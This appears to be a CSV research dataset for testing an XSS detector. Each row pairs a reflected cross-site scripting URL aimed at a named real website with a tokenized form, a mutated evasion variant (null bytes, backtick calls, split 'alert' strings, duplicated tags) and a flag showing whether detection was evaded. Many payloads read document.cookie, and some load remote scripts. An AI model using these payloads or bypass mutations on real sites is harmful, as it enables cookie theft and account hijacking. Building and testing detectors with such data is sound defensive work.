Initial Payload,Initial Payload Tokenized,Mutated Payload,Mutated Payload Tokenized,Not Detected
http://festival.eurockeennes.fr:80/templates/gk_musictube/lib/scripts/menu.php?width=1&amp;height=1&amp;opac<br>ity=1&amp;animation=1&amp;speed=&lt;script&gt;alert(1337)&lt;/script&gt;,"[['http://u', 'None', 'None', 'None', 'None', '<script>', 'alert(', '0', ')', '</script>']]",http://festival.eurockeennes.fr:80/templates/gk_musictube/lib/scripts/menu.php?width=1&amp;height=1&amp;opac<br><br><br><br><br><br><br><br>ity=1&amp;animation=1&amp;speed=&lt;script&gt;&lt;script&gt;&lt;script&gt;&lt;script&gt;&lt;script&gt;&lt;script&gt;&lt;script&gt;&lt;script&gt;alert`1337`&lt;/script&gt;&lt;/script&gt;&lt;/script&gt;&lt;/script&gt;&lt;/script&gt;&lt;/script&gt;&lt;/script&gt;&lt;/script&gt;,"[['http://u', 'None', 'None', 'None', 'None', '<script>', '<script>', '<script>', '<script>', '<script>', '<script>', '<script>', '<script>', '</script>', '</script>', '</script>', '</script>', '</script>', '</script>', '</script>', '</script>']]",True
http://geeks.ues.edu.sv/wiki/index.php?n=main.wikisandbox?from=%22/&gt;&lt;body onload=alert(1)&gt;,"[['http://u', 'from=', '>', '<body onload=alert(0)>']]",http://geeks.ues.edu.sv/wiki/index.php?n=main.wikisandbox?from=%22/&lt;body %00onload=alert(1)&gt;,"[['http://u', 'from=', 'None']]",True
"http://www.budget.com/budgetsearch/sitesearch.jsp?ui_mode=question&amp;question_box=%22;alert(string.fro<br>mcharcode(88,83,83))//","[['http://u', 'None', 'alert(', 'string.fromcharcode(', '0,0,0)', ')']]","http://www.budget.com/budgetsearch/sitesearch.jsp?ui_mode=question&amp;question_box=%22;alert`string.fro<br>mcharcode`88,83,83``//","[['http://u', 'None']]",True
http://music.yahoo.com/eda/33649561/default.asp?id=1e308';alert('bugreport.ir%20xss for<br>xssed.com');a=',"[['http://u', 'alert(', ')', 'a=']]",http://music.yahoo.com/eda/33649561/default.asp?id=1e308';alert`'bugreport.ir%20xss for<br xssed.com'`;a=',"[['http://u', 'None', 'a=']]",True
http://etrade.ic.hk/livechat/message_box.php?theme=&amp;l=admin&amp;x=%22%3e%3cscript%3ealert(document.cooki<br>e)%3c%2fscript%3e&amp;deptid=1,"[['http://u', 'l=', 'x=', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>', 'None']]",http://etrade.ic.hk/livechat/message_box.php?theme=&amp;l=admin&amp;x=%22%3cscript%00%3ealert`document.cooki<br%00>e`%3c%2fscript%00%3e&amp;deptid=1,"[['http://u', 'l=', 'x=', 'None', 'None', 'None', 'None']]",True
http://www.safety-lab.com/en/order.php?o=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert%281337%29%3c%2fscr<br>ipt%3e%3e%3cmarquee%3e%3ch1%3exss+by+rohit%3c%2fh1%3e%3c%2fmarquee%3e&amp;v=14&amp;lang=en&amp;action=frommasthe<br>ad&amp;resetcriteria=y&amp;cc=us&amp;search.x=28&amp;search.y=16&amp;search=search,"[['http://u', '>', '</title>', '<script>', 'alert(', '0', ')', '</script>', '>', '<marquee>', '<h0>', '</h0>', '</marquee>', 'v=', 'lang=', 'action=', 'None', 'None', 'x=', 'y=', 'search=']]",http://www.safety-lab.com/en/order.php?o=%27%22%3c%00%2ftitle%00%3c%00%00%2ftitle%3c%00%00script%3c%00%00%00script%3ealert%281337%29%3c%2fscr<br%00 %00ipt%3c%2fscr<br%00 %00ipt%00%00%00%3e%3c%00%00%00%00%00marquee%3c%00marquee%3c%00h1%3c%00%00h1%3exss+by+rohit%3c%2fh1%00%3c%00%2fh1%3c%00%00%00%2fmarquee%3c%00%00%2fmarquee%00%00%3e&amp;v=14&amp;lang=en&amp;action=frommasthe<br ad&amp;resetcriteria=y&amp;cc=us&amp;search.x=28&amp;search.y=16&amp;search=search,"[['http://u', 'None', 'alert(', '0', ')', 'None', 'None', 'None', 'v=', 'lang=', 'action=', 'None', 'None', 'None', 'x=', 'y=', 'search=']]",False
http://www.sellitonthespot.com/loginform.php?loc=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://www.sellitonthespot.com/loginform.php?loc=&quot;&lt;%00script&gt;alert`document.cookie`&lt;/script%00&gt;,"[['http://u', 'None', 'None']]",True
http://student.km.ru/search.asp?id_subject=')%3e%3c/script%3e%3cscript%3ealert(document.cookie)%3c/s<br>cript%3e,"[['http://u', ')', '>', '</script>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://student.km.ru/search.asp?id_subject=')%3c%00%00/script%00%00%3c%00%00script%00%00%3etop['al'+'ert'](1)(document.cookie)%3c/s<br%00%00%00>cript%00%3e,"[['http://u', ')', 'None', 'None', 'None', 'None', ')', 'None', '>']]",False
http://www.footjoy.jp/search.asp?q=%22%3e%27%3e%22%3c%27%3c%3cscript%3e%3c%2fscript%3e%27%25%3c%27%3<br>e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2fkusomiso.com%2fxss.js%3e%3c%2fscript%3e,"[['http://u', '>', '>', 'None', '</script>', 'None', '>', '<script/src=http://kusomiso.com/xss.js>', '</script>']]",http://www.footjoy.jp/search.asp?q=%22%3e%27%3e%22%3c%27%3c%00%3cscript%3c%2fscript%00%3e%27%25%3c%27%3<br%00>e%22%3c%00script%2fsrc%3dhttp%3a%2f%2fkusomiso.com%2fxss.js%3c%2fscript%3e,"[['http://u', '>', '>', 'None', 'None', 'None']]",False
http://www.dictation.philips.com/index.php?id=39&imageid=1744%27&cc=%27%3e%3cscript%3ealert%28document.cookie%29;%3c/script%3e,"[['http://u', 'None', 'None', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://www.dictation.philips.com/index.php?id=39&imageid=1744%27&cc=%27%3cscript%3ealert%28document.cookie%29;%3c/script%3e,"[['http://u', 'None', 'None', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",False
http://www.netopular.com/search.php?q=xylitol%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%<br>3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,"[['http://u', '>', '</title>', '<script>', 'alert(', '0', ')', '</script>', '>', '<marquee>', '<h0>', '</h0>', '</marquee>']]",http://www.netopular.com/search.php?q=xylitol%27%22%3c%00%00/title%3cscript%3etop['al'+'ert']`1``1337`%3c/script%<br%00>3e%27%22%3cmarquee%3ch1%00%3exss%20by%20xylitol%3c%00/h1%3c/marquee%00%3e,"[['http://u', 'None', 'None', 'None', 'None', 'None', 'None']]",True
http://www.waseda-shop.com/product_info.php/cpath/%22%3e%3chr%3e%3cmarquee%3e%3ch1%3eby%20kusomiso.c<br>om%3c/h1%3e%3c/marquee%3e,"[['http://www', '>', 'None', '<marquee>', '<h0>', '</h0>', '</marquee>']]",http://www.waseda-shop.com/product_info.php/cpath/%22%3e%3chr%3e%3chr%3e%3cmarquee%3e%3cmarquee%3e%3ch1%3e%3ch1%3eby%20kusomiso.c<br><br>om%3c/h1%3e%3c/h1%3e%3c/marquee%3e%3c/marquee%3e,"[['http://www', '>', 'None', 'None', '<marquee>', '<marquee>', '<h0>', '<h0>', '</h0>', '</h0>', '</marquee>', '</marquee>']]",False
http://support.technorati.com/search.php?q=%22%3e%3cscript%3ealert%28%2ftotalschaden%2f%29%3c/script<br>%3e,"[['http://u', '>', '<script>', 'alert(', 'None', ')', '</script>']]",http://support.technorati.com/search.php?q=%22%3cscript%00%3cscript%00%3etop['al'+'ert'](1)%28%2ftotalschaden%2f%29%3c/script<br%00>%3c/script<br%00>%3e,"[['http://u', 'None', 'None', 'None', 'None', ')', 'None', 'None', '>']]",False
http://www.moonsports.com/igallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>', '>', '<marquee>', '<h0>', '</h0>', '</marquee>']]",http://www.moonsports.com/igallery/igallery.asp?d=&quot;&lt;%00script&gt;top['al'+'ert']`1``document.cookie`&lt;/script%00&lt;marquee<br%00 &lt;h1&gt;by%20narcoticxs&lt;%00/h1&lt;/marquee&gt;,"[['http://u', 'None', 'None', 'None', 'None', 'None']]",True
http://sudani.com/dir/s.asp?l=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', '""maxwel""', ')', '</script>']]",http://sudani.com/dir/s.asp?l=&quot;&lt;script%00&gt;alert`&quot;maxwel&quot;`&lt;/script%00&gt;,"[['http://u', 'None', 'None']]",True
http://www.yigitemlak.com/index2.php?option=com_content&amp;user_rating=1&amp;submit_vote=index2.php?option=<br>com_content&amp;user_rating=1&amp;submit_vote=%e8%a9%95%e4%be%a1&amp;task=vote&amp;pop=0&amp;itemid=10&amp;cid=1&amp;url=http://<br>xssed.com,"[['http://u', 'user_rating=', 'submit_vote=', 'option=', 'user_rating=', 'submit_vote=', 'task=', 'pop=', 'itemid=', 'cid=', 'url=', 'http://xssed']]",http://www.yigitemlak.com/index2.php?option=com_content&amp;user_rating=1&amp;submit_vote=index2.php?option=<br com_content&amp;user_rating=1&amp;submit_vote=%e8%a9%95%e4%be%a1&amp;task=vote&amp;pop=0&amp;itemid=10&amp;cid=1&amp;url=http://<br xssed.com,"[['http://u', 'user_rating=', 'submit_vote=', 'option=', 'None', 'user_rating=', 'submit_vote=', 'task=', 'pop=', 'itemid=', 'cid=', 'url=', 'None', 'None']]",True
http://nemadanema.rs/index.php?q=%22%3e%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e&s=tra%c5%bei&p=4,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>', 's=', 'p=']]",http://nemadanema.rs/index.php?q=%22<script>/drfv//drfv/alert%28document.cookie%29%3c%2fscript%3e&s=tra%c5%bei&p=4,"[['http://u', '<script>', 'alert(', 'document.cookie', ')', '</script>', 's=', 'p=']]",False
http://www.iwindsurf.com/services.iws?info=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', '""maxwel""', ')', '</script>']]",http://www.iwindsurf.com/services.iws?info=&quot;&lt;%00script&gt;alert`&quot;maxwel&quot;`&lt;%00/script&gt;,"[['http://u', 'None', 'None']]",True
http://kitchen.technorati.com/review/search/%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e'%2<br>2%3e%3cmarquee%3e%3ch1%3emystick%3c/h1%3e%3c/marquee%3e,"[['None', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>', '>', '<marquee>', '<h0>', '</h0>', '</marquee>']]",http://kitchen.technorati.com/review/search/%22<sc%00ript>/drfv//drfv/alert`document.cookie`%3c/script%00%3e'%2<br%00>2%3cmarquee%3c%00h1%3emystick%3c/h1%3c/marquee%00%3e,"[['None', 'None', 'None', 'None', 'None', 'None']]",True
http://www.agc.army.mil/index.cfm?searchstring=%22%3e%3cscript%3ealert%28document.cookie%29%3c/scrip<br>t%3e&amp;input=search,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>', 'None']]",http://www.agc.army.mil/index.cfm?searchstring=%22%3cscript%3etop['al'+'ert']`1`%28document.cookie%29%3c/scrip<br>t%3e&amp;input=search,"[['http://u', '<script>', 'None', 'None', 'document.cookie', ')', '</script>', 'None']]",False
http://www.afandpa.org/template.cfm?section=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', '""maxwel""', ')', '</script>']]",//www.afandpa.org/template.cfm?section=&quot;&lt;script%00&gt;alert`&quot;maxwel&quot;`&lt;%00/script&gt;,"[['http://u', 'None', 'None']]",True
"http://www.innovations.harvard.edu/topic.html?c=26zzzzzzzzzz""><script>alert(1)</script>","[['http://u', '>', '<script>', 'alert(', '0', ')', '</script>']]","http://www.innovations.harvard.edu/topic.html?c=26zzzzzzzzzz""><script>/drfv/<script>/drfv/alert`1`</script></script>","[['http://u', '>', '<script>', '<script>', '</script>', '</script>']]",False
http://ci.lemon-grove.ca.us/index.asp?nid=-404&amp;badlink=/search.asp?searchstring=cc&quot;&gt;&lt;script&gt;alert(&quot;b<br>luemax&quot;)&lt;/script&gt;,"[['http://u', 'None', 'searchstring=', '>', '<script>', 'alert(', '""bluemax""', ')', '</script>']]",http://ci.lemon-grove.ca.us/index.asp?nid=-404&amp;badlink=/search.asp?searchstring=cc&quot;&lt;script&lt;script&gt;alert`&quot;b<br><br>luemax&quot;`&lt;/script&lt;/script&gt;,"[['http://u', 'None', 'searchstring=', 'None', 'None']]",True
http://ms131.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,"[['http://u', '>', '<script>', 'alert(', '""maxwel""', ')', '</script>']]",http://ms131.mysearch.com/search/ggweb.jhtml?searchfor=%22%3c%00script%3ealert`%22maxwel%22`%3c%00/scri<br>pt%3e,"[['http://u', 'None', 'None']]",True
http://www.inquireaboutthisdomain.com/?domainname=%22%3e%3cscript%3ealert(1)%3c/script%3e,"[['http://u', '>', '<script>', 'alert(', '0', ')', '</script>']]",http://www.inquireaboutthisdomain.com/?domainname=%22%3cscript%00%3ealert`1`%3c%00/script%3e,"[['http://u', 'None', 'None']]",True
http://downloadoutlet.net/signinform.php?msg=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%<br>53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37%2<br>c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%39<br>%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,"[['http://u', '>', '>', '<script>', 'alert(', 'None', '0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)', ')', '</script>']]",http://downloadoutlet.net/signinform.php?msg=%22%3e%27%3c%73%63%72%69%70%74%00%3c%73%63%72%69%70%74%00%3e%61%6c%65%72%74%28%<br%00><br%00>53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37%2<br%00><br%00>c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%39<br%00><br%00>%2c%31%31%31%2c%31%30%39%29%29%3c%00%2f%73%63%72%69%70%74%3c%00%2f%73%63%72%69%70%74%3e%0a,"[['http://u', '>', 'None', 'alert(', 'None', ')', 'None']]",False
http://kb.doubleclick.net/help/search.asp?backpage=%22%27/%3e%3cscript%3ealert(%22oops%22)%3c/script<br>%3e,"[['http://u', '>', '<script>', 'alert(', 'None', ')', '</script>']]",http://kb.doubleclick.net/help/search.asp?backpage=%22%27/%3c%00%00script%3ealert`%22oops%22`%3c/script<br%00%00 %3e,"[['http://u', 'None', 'None']]",True
http://washingtontimes.com/blogs/storyview.php?storyid=20060502-025032-6098r&amp;topicsid=t%22&gt;&lt;script%2<br>0src=http://ha.ckers.org/s.js&gt;&lt;/script&gt;,"[['http://u', 'None', '>', 'None', '</script>']]",http://washingtontimes.com/blogs/storyview.php?storyid=20060502-025032-6098r&amp;topicsid=t%22&lt;%00script%2<br %000src=http://ha.ckers.org/s.js%00&lt;%00%00%00/script&gt;,"[['http://u', 'None', 'None']]",True
http://cract.s206.xrea.com/orz/orz.cgi/-/xssed.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%20kus<br>omiso.com%22)%3c/script%3e,"[['None', '>', '>', '>', '<script>', 'alert(', ')', '</script>']]",//cract.s206.xrea.com/orz/orz.cgi/-/xssed.com/'%3e%22%3e'%3cscript%3c%00script%00%3ealert`%22xss%20by%20kus<br%00 <br%00 omiso.com%22`%3c%00%00/script%3c/script%3e,"[['>', '>', 'None', 'None']]",False
http://www.music.yahoo.ca/video/0/?sx=%3c/script%3e%3cscript%3ealert(123)%3c/script%3e,"[['http://u', '</script>', '<script>', 'alert(', '0', ')', '</script>']]",http://www.music.yahoo.ca/video/0/?sx=%3c/script%00%3e%3cscript%00%3ealert`123`%3c/script%00%3e,"[['http://u', 'None', 'None', 'None']]",True
http://www.ceg-uk.com.cn/my.asp?bigclassname=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', '""maxwel""', ')', '</script>']]",http://www.ceg-uk.com.cn/my.asp?bigclassname=&quot;&lt;script%00&gt;alert`&quot;maxwel&quot;`&lt;/script%00&gt;,"[['http://u', 'None', 'None']]",True
http://www.aliraif.com.tr/urunler.asp?baslik=&lt;script&gt;alert(&quot;scriptorium(turkey)<br>hackhaber.com&quot;)&lt;/script&gt;,"[['http://u', '<script>', 'alert(', '""scriptorium(turkey)hackhaber.com""', ')', '</script>']]",http://www.aliraif.com.tr/urunler.asp?baslik=&lt;%00script&gt;alert`&quot;scriptorium`turkey`<br%00>hackhaber.com&quot;`&lt;/script%00&gt;,"[['http://u', 'None', 'None', 'None']]",True
http://www.sacp.org.za/main.php?include=')&quot;&gt;a&lt;/a&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;noscript&gt;,"[['http://u', ')', '>', '</a>', '<script>', 'alert(', 'document.cookie', ')', '</script>', '<noscript>']]",http://www.sacp.org.za/main.php?include='`&quot;&gt;a&lt;%00/a&lt;%00script&gt;alert`document.cookie`&lt;/script%00&lt;noscript%00&gt;,"[['http://u', '>', 'None', 'None']]",False
http://www.sahneistiyoruz.com/imzalar.php?cnt=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://www.sahneistiyoruz.com/imzalar.php?cnt=&quot;&lt;script%00&gt;alert`document.cookie`&lt;/script%00&gt;,"[['http://u', 'None', 'None']]",True
http://www.joomlayellowpages.com/index2.php?option=com_content&amp;user_rating=1&amp;submit_vote=index2.php?<br>option=com_content&amp;user_rating=1&amp;submit_vote=%e8%a9%95%e4%be%a1&amp;task=vote&amp;pop=0&amp;itemid=10&amp;cid=1&amp;url=<br>http://xssed.com,"[['http://u', 'user_rating=', 'submit_vote=', 'option=', 'user_rating=', 'submit_vote=', 'task=', 'pop=', 'itemid=', 'cid=', 'url=', 'http://xssed']]",http://www.joomlayellowpages.com/index2.php?option=com_content&amp;user_rating=1&amp;submit_vote=index2.php?<br option=com_content&amp;user_rating=1&amp;submit_vote=%e8%a9%95%e4%be%a1&amp;task=vote&amp;pop=0&amp;itemid=10&amp;cid=1&amp;url=<br http://xssed.com,"[['http://u', 'user_rating=', 'submit_vote=', 'None', 'option=', 'user_rating=', 'submit_vote=', 'task=', 'pop=', 'itemid=', 'cid=', 'url=', 'None', 'http://xssed']]",True
http://register.typc.doh.gov.tw/netreg/choosedep.asp?mode=%22%3e%3cframe%20src=%22javascript:alert('<br>pappy was here');%22%3e%3c/frameset%3e&amp;subseq=y,"[['http://u', '>', 'None', 'None', 'None']]",http://register.typc.doh.gov.tw/netreg/choosedep.asp?mode=%22%3cframe%20src=%22javascript:alert('<br>pappy was here');%22%3c/frameset%3e&amp;subseq=y,"[['http://u', 'None', 'None']]",True
http://www.freefoto.com/search.jsp?querystring=''&gt;&lt;/script&gt;&lt;script&gt;alert('xss')&lt;/script&gt;,"[['http://u', '>', '</script>', '<script>', 'alert(', ""'xss'"", ')', '</script>']]",http://www.freefoto.com/search.jsp?querystring=&lt;%00/script&lt;%00script&gt;alert`xss`&lt;/script%00%00&gt;,"[['http://u', 'None', 'None']]",True
http://whv.warnerbros.com/whvportal/portal/product.jsp?oid=___%3cscript%3ealert(%22xss%22)%3c/script<br>%3e___,"[['http://u', '<script>', 'alert(', '""xss""', ')', '</script>']]",http://whv.warnerbros.com/whvportal/portal/product.jsp?oid=___%3c%00%00script%3ealert`%22xss%22`%3c/script<br%00%00 %3e___,"[['http://u', 'None', 'None']]",True
http://www.free-host-directory.com/showcategory.php?type=6&amp;keyword=&quot;&gt;&lt;script&gt;alert(backdoor)&lt;/script<br>&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,"[['http://u', 'keyword=', '>', '<script>', 'alert(', 'backdoor', ')', '</script>', '>', '<marquee>', '<h0>', '</h0>', '</marquee>']]",http://www.free-host-directory.com/showcategory.php?type=6&amp;keyword=&quot;&lt;script%00&gt;alert`backdoor`&lt;/script<br%00>&lt;marquee&lt;h1&gt;backdoor&lt;/h1&lt;/marquee%00&gt;,"[['http://u', 'keyword=', 'None', 'None', 'None', 'None']]",True
http://www.southernfriedclickin.info/index.php?ref=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://www.southernfriedclickin.info/index.php?ref=&quot;&lt;%00script&gt;alert`document.cookie`;&lt;/script%00&gt;,"[['http://u', 'None', 'None']]",True
http://zone.org/search.php?search_type=1&amp;contenttype=vbblog_blogentry&amp;query=%22%3e%3cscript%3ealert%<br>28%22daimon%22%29%3c/script%3e,"[['http://u', 'None', 'query=', '>', '<script>', 'alert(', 'None', ')', '</script>']]",http://zone.org/search.php?search_type=1&amp;contenttype=vbblog_blogentry&amp;query=%22%3cscript%3ealert%<br 28%22daimon%22%29%3c/script%3e,"[['http://u', 'None', 'query=', '<script>', 'None']]",False
http://www.ci.galesburg.il.us/search.asp?target=radios&quot;&gt;&lt;script&gt;alert(&quot;bluemax&quot;)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', '""bluemax""', ')', '</script>']]",http://www.ci.galesburg.il.us/search.asp?target=radios&quot;&lt;script%00&gt;alert`&quot;bluemax&quot;`&lt;%00/script&gt;,"[['http://u', 'None', 'None']]",True
http://www.bankofireland.ie/site-search/htsearch?words=%3cscript%3ealert%28%22xss%22%29%3c%2fscript%<br>3e&amp;submit=go,"[['http://u', '<script>', 'alert(', '""xss""', ')', '</script>', 'submit=']]",http://www.bankofireland.ie/site-search/htsearch?words=%3c%00script%3c%00script%3ealert%28%22xss%22%29%3c%2fscript%<br%00><br%00>3e&amp;submit=go,"[['http://u', 'None', 'alert(', '""xss""', ')', 'None', 'None', 'submit=']]",False
http://www.hackney.gov.uk/servapps/googlesearch/hackney/resultsb.asp?cx=013470174590691097405%3a3fbh<br>qwd9fes&amp;cof=forid%3a11&amp;q=%22%3e%3cscript%3ealert%28123%29%3c%2fscript%3e&amp;sa=search,"[['http://u', '0:', 'cof=', 'forid:', 'q=', '>', '<script>', 'alert(', '0', ')', '</script>', 'sa=']]",http://www.hackney.gov.uk/servapps/googlesearch/hackney/resultsb.asp?cx=013470174590691097405%3a3fbh<br qwd9fes&amp;cof=forid%3a11&amp;q=%22%3cscript%00%3ealert%28123%29%3c%2fscript%00%3e&amp;sa=search,"[['http://u', '0:', 'None', 'alert(', '0', ')', 'None', 'sa=']]",False
